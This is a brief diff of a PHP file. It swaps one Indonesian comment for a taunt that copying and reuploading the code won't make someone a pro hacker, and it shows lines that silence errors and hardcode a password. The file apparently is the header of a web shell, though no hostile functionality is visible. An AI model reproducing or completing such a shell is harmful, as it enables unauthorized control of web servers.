@@ -1,5 +1,5 @@
 <?php
-// Hayo ngapain 
+// Merecode & reupload tidak akan menjadikanmu hekers yang pro.
 error_reporting(0);
 $password='oit';
 $xyn='psatir';
